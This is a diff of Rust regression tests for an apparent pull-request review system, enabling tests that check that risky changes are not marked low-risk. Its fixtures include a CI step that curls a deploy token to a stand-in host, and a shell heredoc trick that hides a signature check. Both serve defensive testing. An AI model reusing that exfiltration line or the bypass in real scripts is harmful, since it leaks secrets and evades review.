@@ -1547,6 +1547,25 @@ mod s21_cycle2 {
         s.lines().find(|l| l.starts_with("VmRSS:")).and_then(|l| l.split_whitespace().nth(1)).and_then(|n| n.parse().ok()).unwrap()
     }
 
+    /// Run test `name` again in a process of its own (it measures this
+    /// process's memory, which other tests of the suite share): true in the
+    /// parent, which has checked the child passed and should return.
+    fn in_own_process(name: &str) -> bool {
+        const CHILD: &str = "VEIL_S21_MEMORY_CHILD";
+        if std::env::var(CHILD).is_ok() {
+            return false;
+        }
+        let out = std::process::Command::new(std::env::current_exe().unwrap())
+            .args(["--exact", name, "--nocapture", "--test-threads=1", "--include-ignored"])
+            .env(CHILD, "1")
+            .output()
+            .unwrap();
+        let (stdout, stderr) = (String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
+        stderr.lines().filter(|l| l.contains("grew by")).for_each(|l| eprintln!("{l}"));
+        assert!(out.status.success() && stdout.contains("1 passed"), "{name} in its own process:\n{stdout}\n{stderr}");
+        true
+    }
+
     /// Reset the peak to the current resident size (Linux 4.0+).
     fn reset_peak() {
         std::fs::write("/proc/self/clear_refs", "5").unwrap();
@@ -1718,7 +1737,6 @@ mod s21_cycle2 {
     /// the commands after it (here `verify_signature`). Each change is
     /// "whitespace-only", so low risk and ready with no review.
     #[test]
-    #[ignore = "BUG-1256: a whitespace-only change to a shell script's heredoc delimiter is low risk"]
     fn bug_1256_a_trailing_space_on_a_heredoc_delimiter_needs_no_review() {
         let script = "#!/bin/sh\nset -e\ncat > /etc/motd <<END\nWelcome\nEND\nverify_signature \"$PKG\" || exit 1\ncat >> /etc/motd <<END\nInstalling\nEND\ninstall_package \"$PKG\"\n";
         let space = script.replacen("Welcome\nEND\n", "Welcome\nEND \n", 1);
@@ -1740,7 +1758,6 @@ mod s21_cycle2 {
     /// declared by `mod test_mode;`) are "tests", so low risk and ready with
     /// no review.
     #[test]
-    #[ignore = "BUG-1257: CI workflows and source files named like tests are low risk"]
     fn bug_1257_ci_workflows_and_sources_named_like_tests_need_no_review() {
         let cases = [
             (".github/workflows/integration_test.yml", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test\n", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://example.invalid/x -d \"$DEPLOY_TOKEN\"\n"),
@@ -1765,8 +1782,10 @@ mod s21_cycle2 {
     /// anyone who sees the PR (anyone on Earth for a public one), holds
     /// about 134 MiB.
     #[test]
-    #[ignore = "BUG-1258: a thread listing reads 2,100 comments of 64 KiB to answer 1 MiB"]
     fn bug_1258_a_thread_listing_holds_far_more_than_it_answers() {
+        if in_own_process("prs::s21_cycle2::bug_1258_a_thread_listing_holds_far_more_than_it_answers") {
+            return;
+        }
         let th = TestHub::start();
         let (policy_text, bindings) = policy(1);
         let mut h = Hist::new(&th, &policy_text, &bindings);
@@ -1827,8 +1846,10 @@ mod s21_cycle2 {
     /// thread each holds gigabytes (the PR's author, or anyone who may
     /// update it, chooses the files).
     #[test]
-    #[ignore = "BUG-1258: carrying threads holds about 90 bytes per byte of each file's text"]
     fn bug_1258_carrying_threads_holds_far_more_than_its_budget() {
+        if in_own_process("prs::s21_cycle2::bug_1258_carrying_threads_holds_far_more_than_its_budget") {
+            return;
+        }
         let files: usize = std::env::var("VEIL_BUG1258_FILES").ok().and_then(|s| s.parse().ok()).unwrap_or(8);
         let th = TestHub::start();
         let (policy_text, bindings) = policy(1);
@@ -1903,7 +1924,6 @@ mod s21_cycle2 {
     /// they cannot even see it was dropped. One approval from someone who
     /// writes both folders then makes it ready.
     #[test]
-    #[ignore = "BUG-1259: a new revision touching a folder the reviewer cannot write drops their request for changes"]
     fn bug_1259_a_request_for_changes_is_dropped_by_touching_a_folder_the_reviewer_cannot_write() {
         let th = TestHub::start();
         let (alice, _) = person_row(&th, "alice");
@@ -1940,6 +1960,15 @@ mod s21_cycle2 {
         assert!(th.rt.block_on(prs::show(&hub, &as_person(alice), &id)).is_err(), "the PR now touches fin/: alice cannot see it");
         let v = th.rt.block_on(prs::show(&hub, &as_person(bob), &id)).unwrap();
         assert_eq!(v["review"]["ready"], false, "alice asked for changes to pub/auth.rs and has not approved: {v}");
+        // Only an admin releases it (alice can no longer see the PR); the
+        // author cannot.
+        let (adm, adm_name) = person_row(&th, "admin");
+        let req = prs::DismissRequest { person: th.rt.block_on(sqlx::query_scalar::<_, String>("SELECT name FROM people WHERE id = $1").bind(alice).fetch_one(&hub.db)).unwrap() };
+        let r = th.rt.block_on(prs::dismiss(&hub, &as_person(bob), &me, &id, req.clone()));
+        assert!(matches!(r, Err(Error::Api { code: "forbidden", .. })), "{r:?}");
+        let v = th.rt.block_on(prs::dismiss(&hub, &ask_as(&th, &h, &admin_of(adm)), &caller(adm, &adm_name), &id, req.clone())).unwrap();
+        assert_eq!(v["review"]["ready"], true, "dismissed by an admin; cy's approval counts: {v}");
+        assert!(matches!(th.rt.block_on(prs::dismiss(&hub, &ask_as(&th, &h, &admin_of(adm)), &caller(adm, &adm_name), &id, req)), Err(Error::Api { code: "not_found", .. })));
     }
 
     /// BUG-1259 (`.veilrules`): a broken file keeps the last valid rules
@@ -1949,7 +1978,6 @@ mod s21_cycle2 {
     /// silently drops to one approval as the branch moves on. At 1,000
     /// landings a second (phase 4's gate) that is one second.
     #[test]
-    #[ignore = "BUG-1259: a broken .veilrules lowers review to one approval 1,000 changes later"]
     fn bug_1259_a_broken_veilrules_lowers_review_after_1000_changes() {
         let th = TestHub::start();
         let (policy_text, bindings) = policy(1);
